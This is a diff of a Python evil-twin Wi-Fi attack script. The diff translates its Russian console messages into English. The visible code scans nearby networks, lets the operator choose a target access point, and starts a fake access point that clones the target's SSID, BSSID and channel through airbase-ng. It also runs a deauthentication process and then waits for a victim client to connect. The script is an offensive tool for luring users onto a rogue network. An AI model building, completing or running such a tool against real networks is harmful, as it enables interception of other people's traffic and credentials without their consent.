@@ -12,7 +12,7 @@ interface = "wlan0mon"
 procs = []  
 
 def cleanup(signum=None, frame=None):
-    print(f"Завершение работы")
+    print("Shutting down")
     for proc in procs:
         try:
             os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
@@ -139,8 +139,8 @@ def start_evil_twin(mon_iface, target_bssid, target_ssid, target_channel):
     )
     procs.append(deauth_proc)
 
-    print(f"Запущена поддельная точка '{target_ssid}' ({target_bssid}) на канале {target_channel}")
-    print(f"Ожидание подключения клиента (для выхода нажмите Ctrl+C)")
+    print(f"Started fake access point '{target_ssid}' ({target_bssid}) on channel {target_channel}")
+    print("Waiting for client connection (press Ctrl+C to exit)")
 
     associated = False
     try:
@@ -150,28 +150,28 @@ def start_evil_twin(mon_iface, target_bssid, target_ssid, target_channel):
                 associated = True
                 break
     except Exception as e:
-        print(f"Ошибка при чтении вывода airbase-ng: {e}")
+        print(f"Error reading airbase-ng output: {e}")
 
     if associated:
-        print(f"Клиент подключился к поддельной точке доступа!")
+        print("Client connected to fake access point!")
         
     else:
-        print(f"Клиент не подключился (процесс завершён).")
+        print("Client did not connect (process terminated).")
 
 def main():
-    print(f"Сканирование сетей (10 секунд).")
+    print("Scanning networks (10 seconds).")
     networks = scan_networks(interface, duration=10)
 
     if not networks:
-        print(f"Не найдено ни одной точки доступа.")
+        print("No access points found.")
         sys.exit(1)
 
-    print(f"Доступные точки доступа:")
+    print("Available access points:")
     for idx, net in enumerate(networks, 1):
-        print(f"{idx}. SSID: {net['ssid']:<20} | BSSID: {net['bssid']} | Канал: {net['channel']:2} | "
-              f"Шифр: {net['encryption']:<12} | Клиентов: {net['clients']}")
+        print(f"{idx}. SSID: {net['ssid']:<20} | BSSID: {net['bssid']} | Channel: {net['channel']:2} | "
+              f"Encryption: {net['encryption']:<12} | Clients: {net['clients']}")
 
-    choice = input(f"Выберите номер точки доступа или введите BSSID: ").strip()
+    choice = input("Select access point number or enter BSSID: ").strip()
     target = None
     if choice.isdigit():
         idx = int(choice) - 1
@@ -184,14 +184,14 @@ def main():
                 break
 
     if not target:
-        print(f"Неверный выбор.")
+        print("Invalid selection.")
         sys.exit(1)
-    print(f"Выбрана точка доступа:")
+    print("Selected access point:")
     print(f"    SSID: {target['ssid']}")
     print(f"    BSSID: {target['bssid']}")
-    print(f"    Канал: {target['channel']}")
-    print(f"    Шифрование: {target['encryption']}")
-    print(f"    Клиентов: {target['clients']}")
+    print(f"    Channel: {target['channel']}")
+    print(f"    Encryption: {target['encryption']}")
+    print(f"    Clients: {target['clients']}")
     start_evil_twin(interface, target['bssid'], target['ssid'], target['channel'])
 
 if __name__ == "__main__":
